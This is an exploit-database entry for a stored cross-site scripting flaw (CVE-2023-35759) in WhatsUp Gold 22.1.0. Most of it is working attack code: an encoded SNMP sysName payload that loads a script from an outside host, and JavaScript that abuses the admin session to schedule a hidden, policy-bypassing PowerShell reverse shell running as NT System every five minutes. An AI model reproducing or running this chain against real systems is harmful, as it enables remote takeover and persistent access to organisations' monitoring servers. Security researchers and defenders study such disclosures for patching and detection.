@@ -1,0 +1,146 @@
+id: 39309
+date: 02/05/2024
+title: WhatsUp Gold 2022 (22.1.0 Build 39) - XSS Vulnerability
+author: Andreas Finstad
+cves: CVE-2023-35759
+
+# Exploit Title: WhatsUpGold 22.1.0 - Stored Cross-Site Scripting (XSS)
+# Exploit Author: Andreas Finstad (4ndr34z)
+# Vendor Homepage: https://www.whatsupgold.com
+# Version: v.22.1.0 Build 39
+# Tested on: Windows 2022 Server
+# CVE : CVE-2023-35759
+# Reference: https://nvd.nist.gov/vuln/detail/CVE-2023-35759
+
+
+
+WhatsUp Gold 2022 (22.1.0 Build 39) 
+
+Stored XSS in sysName SNMP parameter.
+
+
+Vulnerability Report: Stored XSS in WhatsUp Gold 2022 (22.1.0 Build 39)
+Product Name: WhatsUp Gold 2022
+Version: 22.1.0 Build 39
+Vulnerability Type: Stored Cross-Site Scripting (XSS)
+
+Description:
+WhatsUp Gold 2022 is vulnerable to a stored cross-site scripting (XSS) attack that allows an attacker to inject malicious scripts into the admin console. The vulnerability exists in the sysName SNMP field on a device, which reflects the input from the SNMP device into the admin console after being discovered by SNMP.
+ 
+An attacker can exploit this vulnerability by crafting a specially crafted SNMP device name that contains malicious code. Once the device name is saved and reflected in the admin console, the injected code will execute in the context of the admin user, potentially allowing the attacker to steal sensitive data or perform unauthorized actions.
+
+As there is no CSRF tokens or CDP, it is trivial to create a javascript payload that adds an scheduled action on the server, that executes code as "NT System". In my POC code, I add a Powershell revshell that connects out to the attacker every 5 minutes. (screenshot3)
+
+The XSS trigger when clicking the "All names and addresses"
+
+Stage:
+
+Base64 encoded id property:
+var a=document.createElement("script");a.src="https://f20.be/t.js";document.body.appendChild(a);
+
+Staged payload placed in the SNMP sysName Field on a device:
+<img id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZjIwLmJlL3QuanMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7Cg== src=https://f20.be/1 onload=eval(atob(this.id))>
+
+payload:
+
+var vhost = window.location.protocol+'\/\/'+window.location.host
+
+addaction();
+async function addaction() {
+var arguments = ''
+let run = fetch(vhost+'/NmConsole/api/core/WugPowerShellScriptAction?_dc=1655327281064',{
+    method: 'POST',
+    headers: {
+        'Connection': 'close',
+        'Content-Length': '1902',
+        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Microsoft Edge";v="102"',
+        'Accept': 'application/json',
+        'Content-Type': 'application/json',
+        'X-Requested-With': 'XMLHttpRequest',
+        'sec-ch-ua-mobile': '?0',
+        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.33',
+        'sec-ch-ua-platform': '"macOS"',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Dest': 'empty',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'nb,no;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,sv;q=0.5,fr;q=0.4'
+    },
+    credentials: 'include',
+    body: '{"id":-1,"Timeout":30,"ScriptText":"Start-process powershell -argumentlist \\"-W Hidden -noprofile -executionpolicy bypass -NoExit -e JAB0AG0AcAAgAD0AIABAACgAJwBzAFkAUwB0AGUATQAuAG4ARQB0AC4AcwBPAGMAJwAsACcASwBFAHQAcwAuAHQAQwBQAEMAbABJAGUAbgB0ACcAKQA7ACQAdABtAHAAMgAgAD0AIABbAFMAdAByAGkAbgBnAF0AOgA6AEoAbwBpAG4AKAAnACcALAAkAHQAbQBwACkAOwAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAkAHQAbQBwADIAKAAnADEAOQAyAC4AMQA2ADgALgAxADYALgAzADUAJwAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACgAJABlAG4AdgA6AFUAcwBlAHIATgBhAG0AZQApACAAKwAgACcAQAAnACAAKwAgACgAJABlAG4AdgA6AFUAcwBlAHIARABvAG0AYQBpAG4AKQAgACsAIAAoAFsAUwB5AHMAdABlAG0ALgBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoATgBlAHcATABpAG4AZQApACAAKwAgACgAZwBlAHQALQBsAG8AYwBhAHQAaQBvAG4AKQArACcAPgAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==\\" -NoNewWindow","ScriptImpersonateFlag":false,"ClsId":"5903a09a-cce6-11e0-8f66-fe544824019b","Description":"Evil script","Name":"Systemtask"}'
+});
+
+
+setTimeout(() => { getactions(); }, 1000);
+
+};
+
+
+
+async function getactions() {
+
+const response = await fetch(vhost+'/NmConsole/api/core/WugAction?_dc=4',{
+    method: 'GET',
+    headers: {
+        'Connection': 'close', 
+        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Microsoft Edge";v="102"', 
+        'Accept': 'application/json', 
+        'Content-Type': 'application/json', 
+        'X-Requested-With': 'XMLHttpRequest', 
+        'sec-ch-ua-mobile': '?0', 
+        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.33', 
+        'sec-ch-ua-platform': '"macOS"', 
+        'Sec-Fetch-Site': 'same-origin', 
+        'Sec-Fetch-Mode': 'cors', 
+        'Sec-Fetch-Dest': 'empty', 
+        'Accept-Encoding': 'gzip, deflate', 
+        'Accept-Language': 'nb,no;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,sv;q=0.5,fr;q=0.4'
+    },
+    credentials: 'include'
+   
+});
+const actions = await response.json();
+var results = [];
+var searchField = "Name";
+var searchVal = "Systemtask";
+for (var i=0 ; i < actions.length ; i++)
+{
+    if (actions[i][searchField] == searchVal) {
+        results.push(actions[i].Id);
+        revshell(results[0])
+       
+    }
+}
+//console.log(actions);
+
+};
+
+
+async function revshell(ID) {
+fetch(vhost+'/NmConsole/Configuration/DlgRecurringActionLibrary/DlgSchedule/DlgSchedule.asp',{
+    method: 'POST',
+    headers: {
+        'Connection': 'close',
+        'Content-Length': '2442',
+        'Cache-Control': 'max-age=0',
+        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Microsoft Edge";v="102"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"macOS"',
+        'Upgrade-Insecure-Requests': '1',
+        'Origin': 'https://192.168.16.100',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.33',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-User': '?1',
+        'Sec-Fetch-Dest': 'iframe',
+        'Referer': 'https://192.168.16.100/NmConsole/Configuration/DlgRecurringActionLibrary/DlgSchedule/DlgSchedule.asp',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'nb,no;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,sv;q=0.5,fr;q=0.4'
+    },
+    credentials: 'include',
+    body: 'DlgSchedule.oCheckBoxEnableSchedule=on&DlgSchedule.ScheduleType=DlgSchedule.oRadioButtonInterval&DlgSchedule.oEditIntervalMinutes=5&ShowAspFormDialog.VISITEDFORM=visited&DlgRecurringActionGeneral.oEditName=test&DlgRecurringActionGeneral.oComboSelectActionType=21&DlgRecurringActionGeneral.DIALOGRETURNURL=%2FNmConsole%2F%24Nm%2FCore%2FForm-AspForms%2Finc%2FShowAspFormDialog.asp&DlgRecurringActionGeneral.SAVEDFORMSTATE=%253cSavedFormState%253e%253cFormVariables%253e%253coElement%2520sName%3D%2522__VIEWSTATE%2522%2520sValue%3D%2522%25253cViewState%2F%25253e%0D%0A%2522%2F%253e%253c%2FFormVariables%253e%253cQueryStringVariables%2F%253e%253c%2FSavedFormState%253e&DlgRecurringActionGeneral.VISITEDFORM=visited%2C+visited&DlgSchedule.DIALOGRETURNURL=%2FNmConsole%2F%24Nm%2FCore%2FForm-AspForms%2Finc%2FShowAspFormDialog.asp&DlgSchedule.SAVEDFORMSTATE=%253cSavedFormState%253e%253cFormVariables%253e%253coElement%2520sName%3D%2522__VIEWSTATE%2522%2520sValue%3D%2522%25253cViewState%2F%25253e%0D%0A%2522%2F%253e%253c%2FFormVariables%253e%253cQueryStringVariables%2F%253e%253c%2FSavedFormState%253e&__EVENTTYPE=ButtonPressed&__EVENTTARGET=DlgSchedule.oButtonFinish&__EVENTARGUMENT=&DlgSchedule.VISITEDFORM=visited&__SOURCEFORM=DlgSchedule&__VIEWSTATE=%253cViewState%253e%253coElement%2520sName%3D%2522DlgRecurringActionGeneral.RecurringAction-sMode%2522%2520sValue%3D%2522new%2522%2F%253e%253coElement%2520sName%3D%2522RecurringAction-nActionTypeID%2522%2520sValue%3D%2522'+ID+'%2522%2F%253e%253coElement%2520sName%3D%2522Date_nStartOfWeek%2522%2520sValue%3D%25220%2522%2F%253e%253coElement%2520sName%3D%2522Date_sMediumDateFormat%2522%2520sValue%3D%2522MMMM%2520dd%2C%2520yyyy%2522%2F%253e%253coElement%2520sName%3D%2522DlgSchedule.sWebUserName%2522%2520sValue%3D%2522admin%2522%2F%253e%253coElement%2520sName%3D%2522DlgRecurringActionGeneral.sWebUserName%2522%2520sValue%3D%2522admin%2522%2F%253e%253coElement%2520sName%3D%2522DlgSchedule.RecurringAction-sMode%2522%2520sValue%3D%2522new%2522%2F%253e%253coElement%2520sName%3D%2522RecurringAction-sName%2522%2520sValue%3D%2522test%2522%2F%253e%253coElement%2520sName%3D%2522Date_bIs24HourTime%2522%2520sValue%3D%25220%2522%2F%253e%253c%2FViewState%253e%0D%0A&DlgSchedule.oEditDay=&DlgSchedule.oComboSelectMonthHour=0&DlgSchedule.oComboSelectMonthMinute=0&DlgSchedule.oComboSelectMonthAmPm=0&DlgSchedule.oComboSelectWeekHour=0&DlgSchedule.oComboSelectWeekMinute=0&DlgSchedule.oComboSelectWeekAmPm=0'
+});
+};
+
+#  0day.today [2024-02-12]  #
